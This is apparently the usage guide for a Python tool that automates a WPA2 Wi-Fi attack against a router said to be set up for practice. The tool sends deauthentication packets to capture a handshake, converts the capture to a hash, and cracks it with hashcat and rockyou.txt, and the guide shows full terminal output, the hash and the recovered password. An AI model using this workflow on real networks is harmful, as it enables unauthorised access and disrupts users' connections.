# Detailed Instructions for Using the "wifi-attack-automation-tool"

Before running the script `wifi-attack-automation-tool.py`, it is essential to have **root privileges**, as the applications used by the script require these permissions.

Once the necessary privileges have been obtained, proceed to execute the script using the following command:

```
# wifi-attack-automation-tool.py
```

The script itself will verify whether the required **Python packages and system tools** are installed for proper operation.

```
# ./wifi-attack-automation-tool.py 
[2025-06-27 20:27:56.685] <inf> Verifying required Python packages:
[2025-06-27 20:27:56.685] <inf> print_helper_logger is installed
[2025-06-27 20:27:56.685] <inf> scapy is installed
[2025-06-27 20:27:56.685] <inf> deauth_lib is available
[2025-06-27 20:27:56.685] <inf> All required Python packages are ready
[2025-06-27 20:27:56.948] <inf> Verifying required tools:
[2025-06-27 20:27:56.948] <inf> iw found
[2025-06-27 20:27:56.948] <inf> ifconfig found
[2025-06-27 20:27:56.949] <inf> iwconfig found
[2025-06-27 20:27:56.949] <inf> airodump-ng found
[2025-06-27 20:27:56.949] <inf> hcxpcapngtool found
[2025-06-27 20:27:56.949] <inf> hashcat found
[2025-06-27 20:27:56.949] <inf> All tools are ready. System check passed
[2025-06-27 20:27:56.955] <inf> Interfaces that support monitor mode:
[2025-06-27 20:27:56.955] <inf> 1.   wlx00e0202d05b8
Select an interface by number: 1
```

Next, a list of available **network interfaces capable of monitor mode** will be displayed. You must select the desired one; in our case, it is the interface named `wlx00e0202d05b8`, so we choose **option number 1**.

At this point, the script will:
- Configure the selected interface in **monitor mode**.
- Prepare the environment to scan available wireless networks, including:
  - Access Points (AP)
  - Devices connected to them.

```
Select an interface by number: 1
[2025-06-27 20:27:58.718] <inf> You selected: wlx00e0202d05b8
[2025-06-27 20:27:58.737] <inf> 🔻 ifconfig down: OK
[2025-06-27 20:27:58.739] <inf> 📡 iwconfig monitor: OK
[2025-06-27 20:27:58.743] <inf> 🔺 ifconfig up: OK
[2025-06-27 20:27:58.743] <inf> Press [Enter] to begin scanning with airodump-ng...
[2025-06-27 20:27:58.743] <inf> You will run airodump-ng in new window
[2025-06-27 20:27:58.743] <inf> When you're done scanning, press CTRL+C there to stop
```

After pressing [Enter], `airodump-ng` starts to run in order to begin analyzing WiFi devices connected to access points.

```
 CH  1 ][ Elapsed: 12 s ][ 2025-06-27 20:28 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D0:57:94:70:24:76   -1        0        0    0  -1   -1                    <length:  0>
 CC:D4:A1:83:05:2F   -1        0        0    0  -1   -1                    <length:  0>
 88:DE:7C:A2:91:9F   -1        0        0    0  -1   -1                    <length:  0>
 60:8D:26:FA:ED:11   -1        0        0    0  -1   -1                    <length:  0>
 DC:51:93:D5:0A:F2   -1        0        0    0  -1   -1                    <length:  0>
 2C:96:82:DD:4F:80  -52       38        4    0   6  648   WPA2 CCMP   PSK  MOVISTAR-WIFI6-4F80
 EC:BE:DD:AD:08:96  -60       44       12    0   9  195   WPA2 CCMP   PSK  HACK_ME
 34:60:F9:6A:95:62  -68       39        2    0   6  130   WPA2 CCMP   PSK  MOVISTAR-WIFI6-4F80_EXT
 F4:1E:57:06:AA:F3  -69       19        6    0   1  360   WPA3 CCMP   SAE  OSCVER

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 60:8D:26:FA:ED:11  CC:8C:BF:3C:38:05  -57    0 - 1     13      107     
 (not associated)   68:A0:3E:4E:E3:F9  -61    0 - 1      0       13    
 2C:96:82:DD:4F:80  EC:0B:AE:6E:CE:B1  -57    0 - 1e     0        1   
 2C:96:82:DD:4F:80  F4:CE:46:52:FD:7E  -73   54e- 1      0        3   
 2C:96:82:DD:4F:80  36:60:F9:0A:95:62  -73    0 - 1e     0        2   
 EC:BE:DD:AD:08:96  F6:B1:11:45:98:25  -51    0 - 1e   528       49    
 F4:1E:57:06:AA:F3  EE:12:4A:F6:F6:4E  -33    0 -24      0        6   
 F4:1E:57:06:AA:F3  44:07:0B:A9:BD:11  -57    0 - 1e     0        2
```

Once the **target network** has been identified (for example, the AP `HACK_ME` with BSSID `EC:BE:DD:AD:08:96`), we also select the **associated device** to which we will send **DeAuth packets**. In this example, the device `F6:B1:11:45:98:25`.

The objective is to **force its disconnection** in order to capture the **handshake** when it attempts to reconnect.

By stopping the scan with `Ctrl+C`, the script will analyze the devices connected to valid access points and display a list of them.

```
Quitting...
[2025-06-27 20:28:17.570] <wrn> (airodump-ng) Execution interrupted by user (CTRL+C)
[2025-06-27 20:28:17.570] <inf> 📋 Available targets with valid channels:
[2025-06-27 20:28:17.570] <inf> 1) F4:CE:46:52:FD:7E → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
[2025-06-27 20:28:17.570] <inf> 2) F6:B1:11:45:98:25 → BSSID: EC:BE:DD:AD:08:96 (Channel 9)
[2025-06-27 20:28:17.570] <inf> 3) EC:0B:AE:6E:CE:B1 → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
Enter the number of the client to target:
```

We will then be prompted to **select the device to attack**, i.e., the one to which we will send the DeAuth packets. In this case, we select **option number 2**.

```
Enter the number of the client to target: 2
[2025-06-27 20:28:20.822] <inf> 🎯 Target selected: F6:B1:11:45:98:25 → AP: EC:BE:DD:AD:08:96 on channel 9
Enter number of deauth packets to send [default: 25]:
```

Next, we need to specify **how many DeAuth packets** we want to send:
- If no value is entered, the **default** is **25 packets**.
- By default, they will be sent **every 0.5 seconds**.

Once the number of packets is confirmed:
- A process will open using `airodump-ng` to **listen on the channel** corresponding to the selected AP (in this example, **channel 9**).
- Simultaneously, another process will start to **send the DeAuth packets**.

```
[2025-06-27 20:28:23.925] <inf> Handshake capture started: output → /home/oscargomezf/GIT/wifi-attack-automation-tool/captures/MAC_F6B111459825_BSSID_ECBEDDAD0896_CH_9_20250627_2028-01.cap
[2025-06-27 20:28:23.925] <inf> Starting deauth attack on F6:B1:11:45:98:25 → AP EC:BE:DD:AD:08:96
[2025-06-27 20:28:23.927] <inf> Sending 25 DeAuth packets to F6:B1:11:45:98:25 from EC:BE:DD:AD:08:96
.20:28:23  Created capture file "/home/oscargomezf/GIT/wifi-attack-automation-tool/captures/MAC_F6B111459825_BSSID_ECBEDDAD0896_CH_9_20250627_2028-01.cap".
```

```
 CH  9 ][ Elapsed: 12 s ][ 2025-06-27 20:28 ][ WPA handshake: EC:BE:DD:AD:08:96

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 EC:BE:DD:AD:08:96  -61   0       89       13    0   9  195   WPA2 CCMP   PSK  HACK_ME

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 EC:BE:DD:AD:08:96  F6:B1:11:45:98:25  -45    1e-11      0       60  PMKID
 EC:BE:DD:AD:08:96  CC:8C:BF:3C:38:05  -61    0 - 1     36       24    
```

After the attack is completed, the **capture process will automatically close**.

```
Sent 25 packets.
[2025-06-27 20:28:36.476] <inf> Stopping handshake capture...
```

Subsequently, the tool `hcxpcapngtool` will be used to **convert the `.cap` file generated by `airodump-ng` into a hash format**.

```
[2025-06-27 20:28:36.492] <inf> Convert pcap to hash using hcxpcapngtool
[2025-06-27 20:28:36.500] <inf> (hcxpcapngtool) Conversion successful: /home/oscargomezf/GIT/wifi-attack-automation-tool/captures/wpa2.hc22000
[2025-06-27 20:28:36.500] <inf> /home/oscargomezf/GIT/wifi-attack-automation-tool/captures/wpa2.hc22000: WPA*01*70b128dd915b8008211276e7673bfcae*ecbeddad0896*f6b111459825*4841434b5f4d45***
WPA*02*99ce70ae05369a5d6ec44d7994b8c057*ecbeddad0896*f6b111459825*4841434b5f4d45*9d1be82bcaf2959f56f5f8590cf74329ed4366a4ff8f4f9ee8e65149bd079ef6*0103007502010a0000000000000000001214224b234a0f9cad89d23411447194488f4f405dfda032e44930ec793b934e8e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*00
```

The next step is to select the wordlist you want to use for brute force:

```
[2025-06-27 20:28:36.500] <inf> Trying to crack the hash using Hashcat
[2025-06-27 20:28:36.500] <inf> Available wordlists:
[2025-06-27 20:28:36.500] <inf> 1. rockyou.txt
[2025-06-27 20:28:36.500] <inf> 2. alleged-gmail-with-count.txt
[2025-06-27 20:28:36.500] <inf> 3. 500-worst-passwords.txt
[2025-06-27 20:28:36.500] <inf> 4. hotmail.txt
[2025-06-27 20:28:36.500] <inf> 5. No search password
Select the wordlist you want to use: 1
```

Once you have selected the wordlist, and with the hash file ready, the tool `hashcat` will be used along with the password list `rockyou.txt` to **perform a brute-force attack** in an attempt to **crack the password**.

> ⏳ **Note:** The time required will depend on the size of the wordlist.

```
[2025-06-27 20:28:50.588] <inf> You selected: /home/oscargomezf/GIT/wifi-attack-automation-tool/wordlists/rockyou.txt
[2025-06-26 20:28:50.798] <inf> This task may take several minutes...
[2025-06-26 23:41:57.437] <wrn> Password found: pipeylaura
```

Finally, if the process is successful, the **recovered password will be displayed** (for example, `pipeylaura`).

As a **final step**, the script will **return the WiFi interface to its original state**.

```
[2025-06-26 23:41:57.437] <inf> Restoring interface to mode: managed
```

---

## Additional Notes

- **Note 1:** It is recommended to run the script within a **Python virtual environment** to avoid dependency conflicts.

- **Note 2:** The router with SSID `HACK_ME` has been prepared **exclusively for this practice**.
  - **Security:** WPA + WPA2
  - **Key:** Randomly selected from the `rockyou.txt` wordlist: pipeylaura
